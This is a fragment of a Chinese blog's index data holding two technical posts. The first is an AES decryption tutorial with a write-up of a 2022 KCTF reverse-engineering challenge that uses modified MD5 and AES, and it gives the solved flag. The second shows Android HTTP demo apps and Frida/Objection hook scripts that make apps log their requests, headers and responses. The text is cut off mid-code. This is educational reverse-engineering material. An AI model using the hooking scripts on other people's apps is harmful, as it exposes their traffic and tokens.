","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"总体 加密算法的逆过程就是解密算法.因此,解密算法的轮函数也是由4部分组成,分别是invShiftRows、invSubBytes、invMixColumns、addRoundKey. 其解密过程的伪代码如下: //对AES-128解密来说, Nk = 4, Nb = 4, Nr = 10 void AES_XXX_Decrypt(uint8 in[4 * Nb], uint8 out[4 * Nb], uint8 key[4 * Nk]) { //将输入复制到状态数组 uint8 state[4 * Nb] = in; //密钥扩展 uint32 dw[Nb * (Nr + 1)] = keyExpansion(key[4 * Nk]); //轮密相加 //此时使用的秘钥是加密时使用秘钥的倒序 addRoundKey(state, dw); for (int i = 1; i \u003c 10; ++i) { dw += 4; invSubBytes(state); invShiftRows(state); addRoundKey(state, dw); invMixColumns(state); } invSubBytes(state); invShiftRows(state); addRoundKey(state, dw + 4); out = state; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:1","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"密钥扩展(keyExpansion) 加密过程中的密钥扩展结果倒序就是解密过程中使用的密钥. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:2","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"逆字节代换(invSubBytes) 是字节代换的逆过程,和字节代换一样,逆字节代换只进行简单的查表操作. AES同时定义了一个逆S盒(Inverse S-Box). ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:3","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"逆行移位(invShiftRows) 是行移位的逆过程,即状态数组中的后3行执行相应的右移操作. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:4","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"逆列混合(invMixColumns) 和列混合的原理相同,区别在于它们使用了不同的多项式.逆列混合使用的系数矩阵如下: uint8_t M[4][4] = {{0x0E, 0x0B, 0x0D, 0x09}, {0x09, 0x0E, 0x0B, 0x0D}, {0x0D, 0x09, 0x0E, 0x0B}, {0x0B, 0x0D, 0x09, 0x0E}}; 它与列混合使用的矩阵互为逆矩阵. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:5","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"轮密相加(addRoundKey) 轮密相加的逆过程就是它本身,因为异或操作是其本身的逆. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:6","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"实战演练 ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"选题 本题选自2022年看雪KCTF的第三题-石像病毒.这是一道利用Windows异常机制来修改标准算法,考察选手对加密算法的熟悉程度. 2022-KCTF-第三题-石像病毒.rar ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:1","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"总体 首先经过简单动态调试,去掉Main函数异常干扰代码,IDA反编译结果如下: int __cdecl main_0(int argc, const char **argv, const char **envp) { void *v3; // esp int result; // eax char v5; // [esp-10h] [ebp-1048h] struc_Luo Src; // [esp+0h] [ebp-1038h] BYREF CPPEH_RECORD ms_exc; // [esp+1020h] [ebp-18h] v3 = alloca(0x1020); memset(\u0026Src, 0xCCu, sizeof(Src)); ms_exc.registration.ScopeTable = (PSCOPETABLE_ENTRY)((int)ms_exc.registration.ScopeTable ^ __security_cookie); memset(Src.szFlag_78, 0, sizeof(Src.szFlag_78)); Src.result_48 = 0; Src.field_4C = 0; Src.field_50 = 0; Src.field_54 = 0; Src.field_58 = 0; Src.field_5C = 0; Src.field_60 = 0; Src.field_64 = 0; Src.field_68 = 0; Src.field_6C = 0; gets_s(Src.szFlag_78, 0xFA0u); if ( strlen(Src.szFlag_78) == 0x20 ) { Src.field_40 = 0x200; strcpy(\u0026Src.field_24, \"Enj0y_1t_4_fuuuN\"); *(_WORD *)((char *)\u0026Src.field_34 + 1) = 0; HIBYTE(Src.field_34) = 0; Src.field_8 = 0; Src.field_C = 0; Src.field_10 = 0; Src.field_14 = 0; Src.field_18 = 0; Src.field_0 = 0x200; sub_401109(\u0026Src.field_24, 0x10u, (int)\u0026Src.field_8);// MD5 sub_401104(\u0026Src.field_8, 0x10u, (int)Src.szFlag_78, (int)\u0026Src.result_48, 0x20);// AES if ( !memcmp(\u0026Src.result_48, byte_40B200, 0x20u) ) printf(\"OK\\n\", v5); else printf(\"NO\\n\", v5); result = 0; } else { printf(\"NO\\n\", v5); result = 0; } return result; } 可以看到本题简单明了,首先要求我们输入的字符串长度等于0x20,然后通过对字符串\"Enj0y_1t_4_fuuuN\"计算MD5值,将其作为密钥,利用AES算法加密我们输入的值,看是否和内置的值相同.若相同,则正确. 注意 这里用到MD5和AES都是利用了Windows异常机制对其标准过程进行了修改. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:2","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"MD5 利用IDA插件Findcrypt查找算法常量. 交叉引用MD5相关算法常量. .text:00402C60 sub_402C60 proc near ; CODE XREF: sub_4010FA↑j .text:00402C60 push ebp .text:00402C61 mov ebp, esp .text:00402C63 mov eax, 4 .text:00402C68 imul ecx, eax, 2Ah ; '*' .text:00402C6B mov MD5_Constants_40B298[ecx], 0D4AF3085h .text:00402C75 mov eax, 1 .text:00402C7A pop ebp .text:00402C7B retn .text:00402C7B sub_402C60 endp 发现这里修改了MD5常量表中的第(0x2A + 1 = 43)项的值为0x0D4AF3085. 验证. 在x64Dbg中定位到sub_401109函数,看魔改后的MD5计算出来的值. 可以看到上面计算出来的值为:2F65B1FF31ED86D09A285C0F4048059D 找一份标准MD5算法,修改常量表的第43项值为0x0D4AF3085,然后查看是否和上面计算出来的结果相同. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:3","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"AES 总体 首先利用程序中的特征,在Github上搜索一份跟程序中相近的AES源码. https://github.com/lmshao/AES AES-master.zip 在IDA中查看下AES相关函数. int __cdecl sub_401104(void *Src, size_t Size, int a3, int a4, int a5) { return sub_402070((uint8_t *)Src, Size, (uint8_t *)a3, (uint8_t *)a4, a5); } int __cdecl sub_402070(uint8_t *key, size_t keyLen, uint8_t *in, uint8_t *out, int inLen) { int j; // [esp+4h] [ebp-1C8h] unsigned int i; // [esp+8h] [ebp-1C4h] int v8[6]; // [esp+10h] [ebp-1BCh] BYREF int state[11]; // [esp+28h] [ebp-1A4h] BYREF char *v10; // [esp+54h] [ebp-178h] uint8_t *_out; // [esp+58h] [ebp-174h] char v12[360]; // [esp+60h] [ebp-16Ch] BYREF _out = out; v10 = v12; state[6] = 0; state[7] = 0; state[8] = 0; state[9] = 0; state[0] = 0; state[1] = 0; state[2] = 0; state[3] = 0; v8[0] = 0; v8[1] = 0; v8[2] = 0; v8[3] = 0; if ( !key || !in || !out ) return 0xFFFFFFFF; if ( keyLen \u003e 0x10 ) return 0xFFFFFFFF; if ( inLen % 0x10u ) return 0xFFFFFFFF; memcpy(state, key, keyLen); // 密钥长度是0x10,可以看出用的是AES-128加密 keyExpansion_4010BE((int)state, 0x10, (int)v12);// 密钥扩展 for ( i = 0; i \u003c inLen; i += 0x10 ) { sub_401145((uint8_t *)v8, in); addRoundKey_401186(v8, v10); // 轮密相加 for ( j = 1; j \u003c 0xA; ++j ) // 轮数(Nr) = 10,可以也看出这里用的是AES-128加密 { v10 += 0x10; subBytes_401172((int)v8); // 字节代换 sub_40122B((int)v8); mixColumns_40100F((int)v8); // 列混合 addRoundKey_401186(v8, v10); // 轮密相加 } subBytes_401172((int)v8); sub_40122B((int)v8); addRoundKey_401186(v8, v10 + 0x10); sub_40125D((int)v8, _out); _out += 0x10; in += 0x10; v10 = v12; } return 0; } 这里我们输入的字符串是\"XiaLuoHun12345675434567876543Hun\",长度是0x20. 密钥扩展 用IDA查看密钥扩展函数. 切换到反汇编窗口,可以看到有两处异常. 接下来查看下异常处理代码. int sub_40108C() { return sub_402330(); } int sub_402330() { RijnDael_AES_LONG_40B000[0x71] ^= RijnDael_AES_LONG_40B000[0xA3]; RijnDael_AES_LONG_40B000[0xA3] ^= RijnDael_AES_LONG_40B000[0x71]; RijnDael_AES_LONG_40B000[0x71] ^= RijnDael_AES_LONG_40B000[0xA3]; return 1; } 可以发现这里修改了AES的S-Box,以上修改相当于在标准AES算法源码中修改如下: int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) { if (NULL == key || NULL == aesKey){ printf(\"keyExpansion param is NULL\\n\"); return -1; } if (keyLen != 16){ printf(\"keyExpansion keyLen = %d, Not support.\\n\", keyLen); return -1; } uint32_t *w = aesKey-\u003eeK; uint32_t *v = aesKey-\u003edK; /* keyLen is 16 Bytes, generate uint32_t W[44]. */ /* W[0-3] */ for (int i = 0; i \u003c 4; ++i) { LOAD32H(w[i], key + 4*i); } /* W[4-43] */ for (int i = 0; i \u003c 10; ++i) { //修改开始------------ S[0x71] ^= S[0xA3]; S[0xA3] ^= S[0x71]; S[0x71] ^= S[0xA3]; //修改结束----------- w[4] = w[0] ^ MIX(w[3]) ^ rcon[i]; w[5] = w[1] ^ w[4]; w[6] = w[2] ^ w[5]; w[7] = w[3] ^ w[6]; w += 4; } w = aesKey-\u003eeK+44 - 4; for (int j = 0; j \u003c 11; ++j) { //修改开始------------ S[0x71] ^= S[0xA3]; S[0xA3] ^= S[0x71]; S[0x71] ^= S[0xA3]; //修改结束----------- for (int i = 0; i \u003c 4; ++i) { v[i] = w[i]; } w -= 4; v += 4; } //修改开始------------ //根据S-Box计算逆S-Box calc_InvS_Box(); //修改结束----------- return 0; } 注意 修改了AES的S-Box,我们也要同步修改AES的inv_S-Box. //由AES的S盒计算逆S盒. void calc_InvS_Box() { unsigned char sbox_inv[256] = { 0 }; for (int i = 0; i \u003c 256; i++) { unsigned char temp1 = S[i]; inv_S[temp1] = i; } } 行移位 用IDA查看下与行移位相关的代码. 既然F5不行,那就切换到反汇编窗口看下. 这里我们注意到用到了右移,正常来说加密过程中的行移位用的是左移,解密过程中用的是右移.再加上动态调试结果,确认这里是将标准AES加密过程中的行移位修改为了逆行移位.与此同时需要修改解密过程中的逆行移位为行移位. 列混合 用IDA伪代码查看列混合中的Gmul函数好像没问题,但切到汇编窗口就会看到有异常处理. int sub_401249() { return sub_4023D0(); } int sub_4023D0() { byte_40B200[0x10] = 0xF4; byte_40B200[0x11] = 0xF2; return 1; } byte_40B200里面存放的是最终AES计算出来的结果要比对的值,在这里进行了修改. 计算Flag 既然知道了程序修改标准算法的地方,那我们就来写代码计算下Flag. 最终得到的Flag为:flag{db5c6a8dfec4d0ec5569899640} ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:4","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"参考链接 AES算法描述及C语言实现 AES加密算法原理的详细介绍与实现 AES AES ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:5:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["Android 抓包"],"content":"HttpURLConnection ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:1:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"开发流程 配置 需在AndroidManifest.xml文件赋予权限: \u003cuses-permission android:name=\"android.permission.INTERNET\"/\u003e 布局 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cLinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:gravity=\"center|center_horizontal|center_vertical\" tools:context=\".MainActivity\"\u003e \u003cButton android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:gravity=\"center|center_horizontal|center_vertical\" android:id=\"@+id/mybtn\" android:text=\"发送请求\" android:textSize=\"45sp\"\u003e \u003c/Button\u003e \u003c/LinearLayout\u003e 代码 package com.example.luodst; import androidx.annotation.NonNull; import androidx.appcompat.app.AlertDialog; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.os.Handler; import android.os.Message; import android.util.Log; import android.view.View; import android.widget.Button; import java.io.IOException; import java.io.InputStream; import java.net.HttpURLConnection; import java.net.MalformedURLException; import java.net.ProtocolException; import java.net.URL; public class MainActivity extends AppCompatActivity { private static String TAG = \"XiaLuoHun\"; private Handler handler = null; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); initHandler(); // 定位发送请求按钮 Button btn = findViewById(R.id.mybtn); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { getResponse(\"http://www.baidu.com\"); } }); } private void httpUrlConnection(String strUrl){ try { URL url = new URL(strUrl); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); //设置Http请求方法 connection.setRequestMethod(\"GET\"); //设置请求参数 connection.setRequestProperty(\"token\",\"LuoHun\"); //设置连接超时时间 connection.setConnectTimeout(8000); //设置接收超时时间 connection.setReadTimeout(8000); // 开始连接 connection.connect(); //得到响应码 //int responseCode = connection.getResponseCode(); /* if(responseCode == HttpURLConnection.HTTP_OK){ //... }*/ //获取服务器返回的输入流 InputStream in = connection.getInputStream(); //if(in.available() \u003e 0){ // 每次写入1024字节 int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; StringBuffer sb = new StringBuffer(); while ((in.read(buffer)) != -1) { sb.append(new String(buffer)); } sendMsg(sb.toString()); //Log.d(\"LuoHun\", sb.toString()); //关闭Http连接 connection.disconnect(); // } } catch (IOException e) { e.printStackTrace(); } } private void getResponse(String strUrl) { new Thread(new Runnable() { @Override public void run() { httpUrlConnection(strUrl); } }).start(); } private void initHandler() { handler = new Handler(getMainLooper(), new Handler.Callback() { @Override public boolean handleMessage(@NonNull Message msg) { if (msg.what == 1){ AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this); builder.setTitle(\"NOTICE\"); builder.setMessage((String) msg.obj); builder.setPositiveButton(\"Confirm\",null); builder.create().show(); } return false; } }); } private void sendMsg(String message){ Message msg = new Message(); msg.what = 1; msg.obj = message; handler.sendMessage(msg); } } HttpURLConnectionDemo.7z ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:1:1","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"“自吐\"脚本开发 观察上面的开发流程,我们发现几个关键函数: URL类的构造函数,其包含了目标网址的字符串. setRequestMethod和setRequestProperty函数设置请求头和请求参数等信息. getInputStream函数获取response. Hook URL 使用Objection来Hook URL类的构造函数,测试下. android hooking watch class_method java.net.URL.$init --dump-args --dump-backtrace --dump-return 可以看到出现了网址. 编写\"自吐\"脚本. function main(){ Java.perform(function(){ var URL = Java.use('java.net.URL') URL.$init.overload('java.lang.String').implementation = function(urlstr){ console.log('url =\u003e ', urlstr) var result = this.$init(urlstr) return result } }) } setImmediate(main) Hook HttpURLConnection 前期研究 使用Objection Hook HttpURLConnection整个类和构造函数来看下. android hooking watch class java.net.HttpURLConnection android hooking watch class_method java.net.HttpURLConnection.$init --dump-args -- dump-backtrace --dump-return(agent) 发现只有java.net.HttpURLConnection.getFollowRedirects()和HttpURLConnection的构造函数被调用了. 使用Objection在堆上寻找HttpURLConnection实例. android heap search instances java.net.HttpURLConnection 发现不存在任何实例. 查询Android源码可以知道,HttpURLConnection类是一个抽象类,在开发中虽然可以直接使用抽象类去表示,但是在运行过程中是抽象类的具体实现类在工作. 确定HttpURLConnection的具体实现类. 我们注意到第一次出现HttpURLConnection的定义是通过URL类的openConnection()函数完成的,这个函数返回值的类名就是HttpURLConnection的具体实现类,那么我们可以使用Frida来打印openConnection()函数返回值的类名,从而获取HttpURLConnection的具体实现类. function main(){ Java.perform(function(){ var URL = Java.use('java.net.URL') URL.openConnection.overload().implementation = function(){ var result = this.openConnection() console.log('openConnection returnType =\u003e ', result.$className) return result } }) } setImmediate(main) 最终得到HttpURLConnection抽象类的具体实现类为com.android.okhttp.internal.huc.HttpURLConnectionImpl 使用Objection来对HttpURLConnection具体实现类整体进行Hook测试下. android hooking watch class com.android.okhttp.internal.huc.HttpURLConnectionImpl 可以发现,这下上述Demo中使用的每个函数都被调用到了. “自吐\"脚本 function main(){ Java.perform(function(){ var HttpsURLConnectionImpl = Java.use('com.android.okhttp.internal.huc.HttpURLConnectionImpl') //打印请求参数 HttpsURLConnectionImpl.setRequestProperty.implementation = function(key, value){ var result = this.setRequestProperty(key, value) console.log('setRequestProperty =\u003e ',key,': ', value) return result } }) } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:1:2","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"okhttp3 ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:2:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"开发流程 配置 添加权限. 需在AndroidManifest.xml文件赋予权限: \u003cuses-permission android:name=\"android.permission.INTERNET\"/\u003e 在build.gradle文件中添加okhttp3支持. implementation(\"com.squareup.okhttp3:okhttp:3.12.0\") 布局 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cLinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:gravity=\"center|center_horizontal|center_vertical\" tools:context=\".MainActivity\"\u003e \u003cButton android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:gravity=\"center|center_horizontal|center_vertical\" android:id=\"@+id/mybtn\" android:text=\"发送请求\" android:textSize=\"45sp\"\u003e \u003c/Button\u003e \u003c/LinearLayout\u003e 代码 okHttpExample.java package com.example.luodst; import android.util.Log; import java.io.IOException; import java.util.concurrent.TimeUnit; import okhttp3.Call; import okhttp3.Callback; import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Response; public class okHttpExample { private static final String TAG = \"XiaLuoHun\"; // 新建一个Okhttp客户端 OkHttpClient client = new OkHttpClient(); // 新建一个Okhttp客户端 /* OkHttpClient client = new OkHttpClient.Builder() //新建一个拦截器 // .addNetworkInterceptor(new LoggingInterceptor()) //设置读超时 .readTimeout(5, TimeUnit.SECONDS) //设置写超时 .writeTimeout(5, TimeUnit.SECONDS) //设置连接超时 .connectTimeout(15, TimeUnit.SECONDS) //设置是否自动重连 .retryOnConnectionFailure(false) .build();*/ void run(String url) throws IOException { // 构造request Request request = new Request.Builder() .url(url) .header(\"token\",\"LuoHun\") .build(); // 发起异步请求 client.newCall(request).enqueue( new Callback() { @Override public void onFailure(Call call, IOException e) { call.cancel(); } @Override public void onResponse(Call call, Response response) throws IOException { //打印输出 Log.d(TAG, response.body().string()); } } ); } } MainActivity.java package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import java.io.IOException; import java.io.InputStream; import java.net.HttpURLConnection; import java.net.MalformedURLException; import java.net.ProtocolException; import java.net.URL; public class MainActivity extends AppCompatActivity { private static String TAG = \"XiaLuoHun\"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // 定位发送请求按钮 Button btn = findViewById(R.id.mybtn); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { // 访问百度首页 String requestUrl = \"https://www.baidu.com/\"; okHttpExample myExample = new okHttpExample(); try { myExample.run(requestUrl); } catch (IOException e) { e.printStackTrace(); } } }); } } ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:2:1","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"“自吐\"脚本开发 初步研究 观察上述开发流程,假如我们想要获取请求的数据,我们可以Hook okhttp3.OkHttpClient.newCall()函数. 先使用Objection进行快速Hook,测试下. JavaScript代码. function main(){ Java.perform(function(){ var OkHttpClient = Java.use('okhttp3.OkHttpClient') OkHttpClient.newCall.implementation = function(request){ var result = this.newCall(request) console.log(request.toString()) return result } }) } setImmediate(main) 这里需要提一点,上述Hook点是有问题的,可能出现遗漏或多出部分请求,因为存在\"Call\"后没有发出实际请求的情况.观察上述开发流程,发现只有Hook execute()和enqueue(new Callback())才能真正保证每个从okhttp出去的请求都能被获取.但即便如此,按这个流程走,只能看到request,无法同时看到返回的响应,这是有问题的.我们可以采用okhttp拦截器Interceptor来解决这个问题. okhttp拦截器机制 拦截器可以对request做出修改.在数据返回时再对request做出修改. 整个拦截器机制实际上是一个链条,在网络请求传输过程中,最上层的拦截器首先向下传递一个request,并请求下层拦截器返回一个response,下层的拦截器收到request继续向下传递,并请求返回response,直到传递到最后一个拦截器,它对这个request进行处理并返回一个response,然后这个response开始层层向上传递,直到传递到最上层.这样最上层的拦截器就得到了response,整个过程形成一个拦截器的完整递归调用链. 上述流程可以查看okhttp源码中的getResponseWithInterceptorChain()函数. 进一步研究 接下来我们修改上述Demo,添加一个拦截器来打印URL和请求头. 新建一个类LoggingInterceptor继承Interceptor. package com.example.luodst; import android.util.Log; import java.io.IOException; import okhttp3.Interceptor; import okhttp3.Request; import okhttp3.Response; public class LoggingInterceptor implements Interceptor { private static String TAG = \"XiaLuoHun\"; @Override public Response intercept(Chain chain) throws IOException { Request request = chain.request(); Log.i(TAG, \"请求URL: \" + String.valueOf(request.url()) + \"\\n\"); Log.i(TAG, \"请求头: \" + \"\\n\" + String.valueOf(request.headers()) + \"\\n\"); Response response = chain.proceed(request); return response; } } 在okHttpExample.java中添加一个拦截器. //方式一 // 新建一个Okhttp客户端 OkHttpClient client = new OkHttpClient.Builder() //新建一个拦截器 .addNetworkInterceptor(new LoggingInterceptor()) //设置读超时 .readTimeout(5, TimeUnit.SECONDS) //设置写超时 .writeTimeout(5, TimeUnit.SECONDS) //设置连接超时 .connectTimeout(15, TimeUnit.SECONDS) //设置是否自动重连 .retryOnConnectionFailure(false) .build(); //方式二 OkHttpClient client = new OkHttpClient(); OkHttpClient newClient = client.newBuilder() .addInterceptor(new LoggingInterceptor()) .build(); 查看日志输出. 注意 上述只打印了请求信息,并没有打印response.是因为此时response对象还需进一步处理.这些前人已经替我们完成了,okhttp官方还提供了一个日志拦截打印器(okhttp3:logging-interceptor).接下来对官方的代码稍作修改,并替换上述的LoggingInterceptor类即可. 下方的代码就是对头部信息进行处理,并添加对response的处理和打印. package com.example.luodst; import android.util.Log; import java.io.EOFException; import java.io.IOException; import java.nio.charset.Charset; import java.util.concurrent.TimeUnit; import okhttp3.Connection; import okhttp3.Headers; import okhttp3.Interceptor; import okhttp3.MediaType; import okhttp3.Request; import okhttp3.RequestBody; import okhttp3.Response; import okhttp3.ResponseBody; import okhttp3.internal.http.HttpHeaders; import okio.Buffer; import okio.BufferedSource; import okio.GzipSource; public class LoggingInterceptor implements Interceptor { private static final String TAG = \"okhttpGET\"; private static final Charset UTF8 = Charset.forName(\"UTF-8\"); @Override public Response intercept(Chain chain) throws IOException { Request request = chain.request(); RequestBody requestBody = request.body(); boolean hasRequestBody = requestBody != null; Connection connection = chain.connection(); String requestStartMessage = \"--\u003e \" + request.method() + ' ' + request.url(); Log.e(TAG, requestStartMessage); if (hasRequestBody) { // Request body headers are only present when installed as a network interceptor. Force // them to be included (when available) so there values are known. if (requestBody.contentType() != null) { Log.e(TAG, \"Content-Type: \" + requestBody.contentType()); } if (requestBody.contentLength() != -1) { Log.e(TAG, \"Content-Length: \" + requestBody.contentLength()); } } Headers headers = request.headers(); for (int i = 0, count = headers.size(); i \u003c count; i++) { String name = headers.name(i); // Skip headers from the request body as they are explicitly logged above. if (!\"Content-Type\".equalsIgnoreCase(name) \u0026\u0026 !\"Content-Length\".equalsIgnoreCase(name)) { Log.e(TAG, name + \": \" + headers.value(i)); } } if (!h","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:2:2","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"终极\"自吐” Socket ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:3:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"理论基础 